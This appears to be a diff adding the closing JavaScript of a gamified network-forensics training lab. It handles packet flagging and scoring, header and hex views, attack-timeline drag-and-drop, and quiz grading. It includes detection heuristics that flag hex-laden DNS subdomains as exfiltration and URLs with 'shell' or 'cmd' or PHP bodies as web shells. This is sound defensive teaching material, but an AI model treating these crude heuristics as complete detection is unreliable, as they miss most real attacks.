+            if (e.key === 'f' || e.key === 'F') toggleFlag(invIdx, i, e);
+        });
+
+        tbody.appendChild(tr);
+    });
+
+    return wrap;
+}
+
+/* ============================================================
+   FLAG / UNFLAG
+   ============================================================ */
+function toggleFlag(invIdx, pktIdx, event) {
+    event.stopPropagation();
+    const inv = INVESTIGATIONS[invIdx];
+    const wasFlag = !!state.flagged[invIdx][pktIdx];
+    state.flagged[invIdx][pktIdx] = !wasFlag;
+
+    const tr  = document.getElementById(`pkt-row-${invIdx}-${pktIdx}`);
+    const btn = document.getElementById(`flag-btn-${invIdx}-${pktIdx}`);
+
+    if (state.flagged[invIdx][pktIdx]) {
+        tr.classList.add('flagged');
+        btn.classList.add('active');
+        /* Correct flag = +10, wrong flag = -5 */
+        const correct = (inv.flagTargets || []).includes(pktIdx);
+        const delta = correct ? 10 : -5;
+        state.invScores[invIdx] += delta;
+        state.totalScore += delta;
+    } else {
+        tr.classList.remove('flagged');
+        btn.classList.remove('active');
+        /* Undo score */
+        const correct = (inv.flagTargets || []).includes(pktIdx);
+        const delta = correct ? -10 : 5;
+        state.invScores[invIdx] += delta;
+        state.totalScore += delta;
+    }
+
+    /* Update flag counter */
+    const flagCount = Object.values(state.flagged[invIdx] || {}).filter(Boolean).length;
+    const counter = document.getElementById(`flag-count-${invIdx}`);
+    if (counter) counter.querySelector('span').textContent = flagCount;
+
+    /* Update score display */
+    document.getElementById('hdr-score').textContent = Math.max(0, state.totalScore);
+
+    /* If timeline exists, rebuild pool */
+    if (inv.isTimeline) rebuildFlaggedPool(invIdx, inv);
+}
+
+/* ============================================================
+   DETAIL PANEL
+   ============================================================ */
+function buildDetailPanel() {
+    const panel = document.createElement('div');
+    panel.className = 'detail-panel';
+    panel.id = 'detail-panel';
+    panel.innerHTML = `
+        <div class="detail-tabs">
+            <div class="detail-tab active" data-tab="summary" onclick="switchDetailTab('summary',this)">Summary</div>
+            <div class="detail-tab" data-tab="headers" onclick="switchDetailTab('headers',this)">Packet Headers</div>
+            <div class="detail-tab" data-tab="hex" onclick="switchDetailTab('hex',this)">Hex View</div>
+        </div>
+        <div class="detail-body" id="detail-body">
+            <span class="detail-empty">Click a packet row to inspect it.</span>
+        </div>`;
+    return panel;
+}
+
+let activeDetailTab = 'summary';
+let selectedPacketData = null;  // { inv, pktIdx, pkt }
+
+function switchDetailTab(tab, el) {
+    activeDetailTab = tab;
+    document.querySelectorAll('.detail-tab').forEach(t => t.classList.remove('active'));
+    el.classList.add('active');
+    renderDetailContent();
+}
+
+function selectPacket(invIdx, pktIdx, inv) {
+    /* Deselect all rows in this investigation */
+    document.querySelectorAll(`#pkt-table-${invIdx} tbody tr`).forEach(tr => tr.classList.remove('selected'));
+    document.getElementById(`pkt-row-${invIdx}-${pktIdx}`).classList.add('selected');
+
+    selectedPacketData = { invIdx, pktIdx, inv };
+    renderDetailContent();
+}
+
+function renderDetailContent() {
+    const body = document.getElementById('detail-body');
+    if (!selectedPacketData) { body.innerHTML = '<span class="detail-empty">Click a packet row to inspect it.</span>'; return; }
+
+    const { invIdx, pktIdx, inv } = selectedPacketData;
+    const pkt = inv.packets[pktIdx];
+    const detail = (inv.details || {})[pktIdx] || {};
+
+    if (activeDetailTab === 'summary') {
+        let noteHtml = '';
+        if (detail.note) {
+            const suspicious = detail.note.startsWith('CRITICAL') || detail.note.startsWith('SUSPICIOUS');
+            noteHtml = `<div class="detail-field" style="margin-top:10px;">
+                <span class="detail-key">Analyst Note</span>
+                <span class="detail-val ${suspicious ? 'suspicious' : 'warn'}">${escHtml(detail.note)}</span>
+            </div>`;
+        }
+
+        body.innerHTML = `
+            <div class="detail-field"><span class="detail-key">Frame Number</span><span class="detail-val">${pktIdx + 1}</span></div>
+            <div class="detail-field"><span class="detail-key">Timestamp</span><span class="detail-val">${pkt.time}s</span></div>
+            <div class="detail-field"><span class="detail-key">Source</span><span class="detail-val">${escHtml(pkt.src)}</span></div>
+            <div class="detail-field"><span class="detail-key">Destination</span><span class="detail-val">${escHtml(pkt.dst)}</span></div>
+            <div class="detail-field"><span class="detail-key">Protocol</span><span class="detail-val">${pkt.proto}</span></div>
+            <div class="detail-field"><span class="detail-key">Frame Length</span><span class="detail-val">${pkt.len} bytes</span></div>
+            <div class="detail-field"><span class="detail-key">Info</span><span class="detail-val">${escHtml(pkt.info)}</span></div>
+            ${noteHtml}`;
+
+    } else if (activeDetailTab === 'headers') {
+        const rows = buildHeaderRows(pkt, detail);
+        body.innerHTML = rows;
+
+    } else if (activeDetailTab === 'hex') {
+        body.innerHTML = buildHexView(pkt, pktIdx);
+    }
+}
+
+/* Build protocol-specific header rows for the Headers tab */
+function buildHeaderRows(pkt, detail) {
+    const fields = [];
+    /* Ethernet stub */
+    fields.push({ k:'Ethernet', v:'IEEE 802.3', c:'' });
+    fields.push({ k:'EtherType', v: detail.ethType || 'IPv4 (0x0800)', c:'' });
+    /* IP stub */
+    fields.push({ k:'IP Version', v:'4', c:'' });
+    fields.push({ k:'TTL', v: detail.ttl || '64', c:'' });
+
+    if (pkt.proto === 'TCP') {
+        fields.push({ k:'TCP Flags', v: detail.flags || '', c: (detail.flags || '').includes('SYN') ? 'warn' : '' });
+        fields.push({ k:'Window Size', v: detail.window || '', c: (detail.window || '').includes('1024') ? 'warn' : '' });
+        fields.push({ k:'Options', v: detail.options || 'None', c:'' });
+    } else if (pkt.proto === 'DNS') {
+        fields.push({ k:'Query Name', v: detail.queryName || extractDNSName(pkt.info), c: isDNSSuspicious(pkt.info) ? 'suspicious' : 'good' });
+        fields.push({ k:'Query Type', v: detail.qtype || 'A', c:'' });
+        if (detail.decoded) fields.push({ k:'Decoded Subdomain', v: detail.decoded, c:'suspicious' });
+        if (detail.rdata)   fields.push({ k:'Response Data', v: detail.rdata, c:'' });
+        if (detail.ttl)     fields.push({ k:'TTL', v: detail.ttl, c: detail.ttl === '0 (suspicious — no caching)' ? 'suspicious' : '' });
+    } else if (pkt.proto === 'HTTP') {
+        fields.push({ k:'Method / Status', v: detail.method || detail.status || 'GET', c:'' });
+        if (detail.url)         fields.push({ k:'URL', v: detail.url, c: detail.url.includes('shell') || detail.url.includes('cmd') ? 'suspicious' : '' });
+        if (detail.host)        fields.push({ k:'Host', v: detail.host, c:'' });
+        if (detail.ua)          fields.push({ k:'User-Agent', v: detail.ua, c:'' });
+        if (detail.contentType) fields.push({ k:'Content-Type', v: detail.contentType, c: detail.contentType.includes('php') ? 'suspicious' : '' });
+        if (detail.body)        fields.push({ k:'Body Preview', v: detail.body.substring(0, 120) + (detail.body.length > 120 ? '…' : ''), c: detail.body.includes('<?php') ? 'suspicious' : '' });
+    } else if (pkt.proto === 'TLS') {
+        if (detail.sni)       fields.push({ k:'SNI', v: detail.sni, c: '' });
+        if (detail.ja3_md5)   fields.push({ k:'JA3 MD5', v: detail.ja3_md5, c: 'suspicious' });
+        if (detail.cert_cn)   fields.push({ k:'Certificate CN', v: detail.cert_cn, c:'' });
+        if (detail.issuer)    fields.push({ k:'Issuer', v: detail.issuer, c: detail.issuer.includes('SELF') ? 'suspicious' : 'good' });
+        if (detail.valid_from)fields.push({ k:'Valid From', v: detail.valid_from, c:'' });
+        if (detail.valid_to)  fields.push({ k:'Valid To', v: detail.valid_to, c:'warn' });
+    }
+
+    return fields.map(f =>
+        `<div class="detail-field">
+            <span class="detail-key">${escHtml(f.k)}</span>
+            <span class="detail-val ${f.c}">${escHtml(f.v)}</span>
+        </div>`
+    ).join('');
+}
+
+/* Generate a plausible hex view stub from packet length */
+function buildHexView(pkt, idx) {
+    const seed = idx * 31 + pkt.len;
+    const bytes = pkt.len > 80 ? 80 : pkt.len;
+    let rows = '<div class="hex-view">';
+    for (let off = 0; off < bytes; off += 16) {
+        const end = Math.min(off + 16, bytes);
+        const hexBytes = [];
+        const asciiBytes = [];
+        for (let b = off; b < end; b++) {
+            const v = (seed * (b + 7) * 13 + b * 17 + 37) & 0xff;
+            hexBytes.push(v.toString(16).padStart(2, '0'));
+            asciiBytes.push(v >= 32 && v < 127 ? String.fromCharCode(v) : '.');
+        }
+        const offsetStr = off.toString(16).padStart(4, '0');
+        rows += `<div><span class="hex-offset">${offsetStr}</span>`;
+        rows += `<span class="hex-bytes">${hexBytes.join(' ').padEnd(47)}</span>`;
+        rows += `<span class="hex-ascii">${escHtml(asciiBytes.join(''))}</span></div>`;
+    }
+    if (pkt.len > 80) rows += `<div style="color:var(--muted);font-size:0.62rem;margin-top:4px;">[${pkt.len - 80} more bytes not shown]</div>`;
+    rows += '</div>';
+    return rows;
+}
+
+function extractDNSName(info) {
+    const m = info.match(/query\s+\S+\s+(.+)/);
+    return m ? m[1] : info;
+}
+
+function isDNSSuspicious(info) {
+    return info.length > 80 || /[0-9a-f]{20,}/i.test(info);
+}
+
+/* ============================================================
+   TIMELINE (Investigation 5)
+   ============================================================ */
+function buildTimeline(inv, invIdx) {
+    if (!state.timelinePlacements[invIdx]) state.timelinePlacements[invIdx] = {};
+
+    const section = document.createElement('div');
+    section.className = 'timeline-section';
+    section.id = `timeline-${invIdx}`;
+
+    section.innerHTML = `
+        <div class="analysis-panel">
+            <div class="analysis-title">Attack Timeline Reconstruction</div>
+            <div class="info-box">Drag flagged packets from the pool below into the correct attack phase.
+            Each correct placement earns +10 points.</div>
+            <div class="timeline-title">Flagged Packet Pool</div>
+            <div class="flagged-pool" id="pool-${invIdx}"
+                 ondragover="event.preventDefault()"
+                 ondrop="dropOnPool(event,${invIdx})">
+                <span id="pool-empty-${invIdx}" style="color:var(--muted);font-size:0.7rem;font-style:italic;">Flag packets in the table above to add them here.</span>
+            </div>
+            <div class="timeline-phases" id="phases-${invIdx}">
+                ${inv.timelinePhases.map((ph, pi) => `
+                    <div class="phase-zone" id="phase-zone-${invIdx}-${pi}"
+                         ondragover="dragOver(event,${invIdx},${pi})"
+                         ondragleave="dragLeave(event,${invIdx},${pi})"
+                         ondrop="dropOnPhase(event,${invIdx},${pi})">
+                        <div class="phase-label">${pi + 1}. ${ph}</div>
+                        <div class="phase-drop-area" id="phase-drop-${invIdx}-${pi}"></div>
+                    </div>`).join('')}
+            </div>
+        </div>`;
+
+    /* Build initial pool from already-flagged state */
+    setTimeout(() => rebuildFlaggedPool(invIdx, inv), 0);
+    return section;
+}
+
+function rebuildFlaggedPool(invIdx, inv) {
+    const pool = document.getElementById(`pool-${invIdx}`);
+    const emptyMsg = document.getElementById(`pool-empty-${invIdx}`);
+    if (!pool) return;
+
+    /* Keep only chips that aren't already placed in a phase */
+    const placed = Object.keys(state.timelinePlacements[invIdx] || {}).map(Number);
+
+    /* Remove existing chips from pool (don't disturb placed chips) */
+    Array.from(pool.querySelectorAll('.draggable-chip')).forEach(ch => ch.remove());
+
+    const flaggedIdxs = Object.entries(state.flagged[invIdx] || {})
+        .filter(([k, v]) => v && !placed.includes(parseInt(k)))
+        .map(([k]) => parseInt(k));
+
+    if (flaggedIdxs.length === 0) {
+        emptyMsg.style.display = '';
+    } else {
+        emptyMsg.style.display = 'none';
+        flaggedIdxs.forEach(pi => {
+            const chip = makeChip(invIdx, pi, inv.packets[pi]);
+            pool.appendChild(chip);
+        });
+    }
+}
+
+function makeChip(invIdx, pktIdx, pkt) {
+    const chip = document.createElement('div');
+    chip.className = 'draggable-chip';
+    chip.draggable = true;
+    chip.id = `chip-${invIdx}-${pktIdx}`;
+    chip.dataset.pktIdx = pktIdx;
+    chip.dataset.invIdx = invIdx;
+    chip.textContent = `#${pktIdx + 1} ${pkt.proto}`;
+    chip.addEventListener('dragstart', e => {
+        e.dataTransfer.setData('text/plain', JSON.stringify({ invIdx, pktIdx }));
+    });
+    return chip;
+}
+
+function dragOver(event, invIdx, phaseIdx) {
+    event.preventDefault();
+    document.getElementById(`phase-zone-${invIdx}-${phaseIdx}`).classList.add('drag-over');
+}
+function dragLeave(event, invIdx, phaseIdx) {
+    document.getElementById(`phase-zone-${invIdx}-${phaseIdx}`).classList.remove('drag-over');
+}
+
+function dropOnPhase(event, invIdx, phaseIdx) {
+    event.preventDefault();
+    document.getElementById(`phase-zone-${invIdx}-${phaseIdx}`).classList.remove('drag-over');
+    const data = JSON.parse(event.dataTransfer.getData('text/plain'));
+    const { pktIdx } = data;
+    const inv = INVESTIGATIONS[invIdx];
+
+    /* Remove chip from wherever it currently lives */
+    const oldChip = document.getElementById(`chip-${invIdx}-${pktIdx}`);
+    if (oldChip) {
+        /* Undo previous score if it was placed before */
+        if (state.timelinePlacements[invIdx][pktIdx] !== undefined) {
+            const prevCorrect = inv.phaseMap[pktIdx] === state.timelinePlacements[invIdx][pktIdx];
+            if (prevCorrect) { state.totalScore -= 10; state.invScores[invIdx] -= 10; }
+        }
+        oldChip.remove();
+    }
+
+    /* Place in new phase */
+    state.timelinePlacements[invIdx][pktIdx] = phaseIdx;
+    const correct = inv.phaseMap[pktIdx] === phaseIdx;
+    if (correct) { state.totalScore += 10; state.invScores[invIdx] += 10; }
+    document.getElementById('hdr-score').textContent = Math.max(0, state.totalScore);
+
+    const drop = document.getElementById(`phase-drop-${invIdx}-${phaseIdx}`);
+    const chip = makeChip(invIdx, pktIdx, inv.packets[pktIdx]);
+    chip.classList.add('in-phase');
+    drop.appendChild(chip);
+}
+
+function dropOnPool(event, invIdx) {
+    event.preventDefault();
+    const data = JSON.parse(event.dataTransfer.getData('text/plain'));
+    const { pktIdx } = data;
+    const inv = INVESTIGATIONS[invIdx];
+    const oldChip = document.getElementById(`chip-${invIdx}-${pktIdx}`);
+
+    if (state.timelinePlacements[invIdx][pktIdx] !== undefined) {
+        const prevCorrect = inv.phaseMap[pktIdx] === state.timelinePlacements[invIdx][pktIdx];
+        if (prevCorrect) { state.totalScore -= 10; state.invScores[invIdx] -= 10; }
+        delete state.timelinePlacements[invIdx][pktIdx];
+        document.getElementById('hdr-score').textContent = Math.max(0, state.totalScore);
+    }
+
+    if (oldChip) oldChip.remove();
+    rebuildFlaggedPool(invIdx, inv);
+}
+
+/* ============================================================
+   ANALYSIS / QUESTIONS PANEL
+   ============================================================ */
+function buildAnalysisPanel(inv, invIdx) {
+    const panel = document.createElement('div');
+    panel.className = 'analysis-panel';
+    panel.id = `analysis-${invIdx}`;
+
+    let html = `<div class="analysis-title">Analyst Questions</div>`;
+
+    inv.questions.forEach((q, qi) => {
+        const letters = ['A','B','C','D','E'];
+        const opts = q.options.map((opt, oi) => {
+            const sel = (state.answered[invIdx] || {})[qi] === oi;
+            return `<div class="mc-option${sel ? ' selected' : ''}" onclick="selectOption(${invIdx},${qi},${oi})" id="opt-${invIdx}-${qi}-${oi}">
+                        <span class="mc-letter">${letters[oi]}.</span>${escHtml(opt)}
+                    </div>`;
+        }).join('');
+
+        html += `
+            <div class="question-block" id="qblock-${invIdx}-${qi}">
+                <div class="question-text"><span class="question-num">Q${qi + 1}.</span> ${escHtml(q.q)}</div>
+                <div class="mc-options">${opts}</div>
+                <div class="question-feedback" id="qfb-${invIdx}-${qi}"></div>
+            </div>`;
+    });
+
+    /* Flag summary hint */
+    html += `<div class="warn-box" style="margin-top:12px;">
+        <b>Flagging:</b> Mark suspicious packets in the table above before submitting.
+        Correct flags: +10 pts each. Incorrect flags: -5 pts each.
+        Questions: +15 pts each.
+    </div>`;
+
+    /* Submit / next bar */
+    const isLast = invIdx === INVESTIGATIONS.length - 1;
+    html += `
+        <div class="submit-bar">
+            <div class="submit-status" id="submit-status-${invIdx}">Answer all questions and flag suspicious packets, then submit.</div>
+            <button class="btn btn-primary" id="submit-btn-${invIdx}" onclick="submitInvestigation(${invIdx})">
+                ${isLast ? 'Finish Lab' : 'Submit & Continue →'}
+            </button>
+        </div>`;
+
+    panel.innerHTML = html;
+    return panel;
+}
+
+/* ============================================================
+   ANSWER SELECTION
+   ============================================================ */
+function selectOption(invIdx, qIdx, optIdx) {
+    /* Do not allow re-answering if already submitted */
+    if (document.getElementById(`qblock-${invIdx}-${qIdx}`).dataset.answered === 'yes') return;
+
+    if (!state.answered[invIdx]) state.answered[invIdx] = {};
+    state.answered[invIdx][qIdx] = optIdx;
+
+    /* Update visual selection */
+    const q = INVESTIGATIONS[invIdx].questions[qIdx];
+    q.options.forEach((_, oi) => {
+        const el = document.getElementById(`opt-${invIdx}-${qIdx}-${oi}`);
+        if (el) el.classList.toggle('selected', oi === optIdx);
+    });
+}
+
+/* ============================================================
+   SUBMIT INVESTIGATION
+   ============================================================ */
+function submitInvestigation(invIdx) {
+    const inv = INVESTIGATIONS[invIdx];
+    let questionScore = 0;
+    let allAnswered = true;
+
+    inv.questions.forEach((q, qi) => {
+        const chosen = (state.answered[invIdx] || {})[qi];
+        const block  = document.getElementById(`qblock-${invIdx}-${qi}`);
+        const fb     = document.getElementById(`qfb-${invIdx}-${qi}`);
+
+        if (chosen === undefined) { allAnswered = false; return; }
+
+        block.dataset.answered = 'yes';
+
+        /* Mark correct/incorrect options and lock the block */
+        q.options.forEach((_, oi) => {
+            const el = document.getElementById(`opt-${invIdx}-${qi}-${oi}`);
+            if (!el) return;
+            el.classList.remove('selected');
+            if (oi === q.correct) el.classList.add('correct');
+            else if (oi === chosen) el.classList.add('incorrect');
+            el.style.pointerEvents = 'none';
+        });
+
+        const correct = chosen === q.correct;
+        if (correct) { questionScore += 15; state.invScores[invIdx] += 15; state.totalScore += 15; }
+
+        fb.textContent = (correct ? '✓ ' : '✗ ') + q.feedback;
+        fb.className = 'question-feedback visible ' + (correct ? 'ok' : 'bad');
+    });
+
+    if (!allAnswered) {
+        document.getElementById(`submit-status-${invIdx}`).textContent = 'Please answer all questions before submitting.';
+        return;
+    }
+
+    /* Update score display */
+    document.getElementById('hdr-score').textContent = Math.max(0, state.totalScore);
+
+    /* Disable submit button */
+    const btn = document.getElementById(`submit-btn-${invIdx}`);
+    if (btn) btn.disabled = true;
+
+    const isLast = invIdx === INVESTIGATIONS.length - 1;
+    if (isLast) {
+        setTimeout(() => showResult(), 800);
+    } else {
+        document.getElementById(`submit-status-${invIdx}`).textContent = 'Investigation complete. Loading next investigation...';
+        setTimeout(() => renderInvestigation(invIdx + 1), 900);
+    }
+}
+
+/* ============================================================
+   RESULT SCREEN
+   ============================================================ */
+function showResult() {
+    document.getElementById('inv-container').innerHTML = '';
+    const resultEl = document.getElementById('result-screen');
+    resultEl.style.display = 'block';
+
+    const score = Math.max(0, state.totalScore);
+    const pct   = Math.round((score / MAX_SCORE) * 100);
+    let rank;
+    if (pct >= 90) rank = 'MASTER PACKET SURGEON';
+    else if (pct >= 75) rank = 'FORENSICS EXPERT';
+    else if (pct >= 50) rank = 'NETWORK ANALYST';
+    else rank = 'PACKET ROOKIE';
+
+    document.getElementById('result-rank').textContent  = rank;
+    document.getElementById('result-score').textContent = score;
+    document.getElementById('result-max').textContent   = `/ ${MAX_SCORE} max pts (${pct}%)`;
+
+    /* Animate bar */
+    setTimeout(() => {
+        document.getElementById('result-bar').style.width = Math.min(pct, 100) + '%';
+    }, 100);
+
+    /* Breakdown per investigation */
+    const breakdown = document.getElementById('result-breakdown');
+    breakdown.innerHTML = state.invScores.map((s, i) =>
+        `<div><span class="stat-val">${Math.max(0,s)}</span>Investigation ${i+1}</div>`
+    ).join('');
+
+    /* Award XP + achievements (once only) */
+    awardCompletion(score, rank);
+
+    /* Update pip 5 to done */
+    updatePips(5);
+}
+
+function awardCompletion(totalScore, rankTitle) {
+    if (!localStorage.getItem('game_netforensics_xp_awarded')) {
+        const currentXP = parseInt(localStorage.getItem('hexworth_xp') || '0');
+        localStorage.setItem('hexworth_xp', (currentXP + 100).toString());
+        localStorage.setItem('game_netforensics_xp_awarded', 'true');
+        if (typeof FirestoreManager !== 'undefined' && FirestoreManager.addXP) {
+            const uid = localStorage.getItem('hexworth_uid');
+            if (uid) FirestoreManager.addXP(uid, 100, 'Network Forensics Lab Complete');
+        }
+    }
+    if (typeof AchievementManager !== 'undefined') AchievementManager.unlock('game_netforensics');
+    if (typeof GameTracker !== 'undefined') GameTracker.record('netforensics', { score: totalScore, maxScore: MAX_SCORE, rank: rankTitle });
+}
+
+/* ============================================================
+   RESTART
+   ============================================================ */
+function restartGame() {
+    state = {
+        currentInv: 0, totalScore: 0, invScores: [0,0,0,0,0],
+        flagged: {}, answered: {}, timelinePlacements: {}
+    };
+    document.getElementById('result-screen').style.display = 'none';
+    document.getElementById('hdr-score').textContent = '0';
+    buildPips();
+    renderInvestigation(0);
+}
+
+/* ============================================================
+   UTILITY
+   ============================================================ */
+function escHtml(str) {
+    if (typeof str !== 'string') return '';
+    return str
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;');
+}
+</script>
+</body>
+</html>
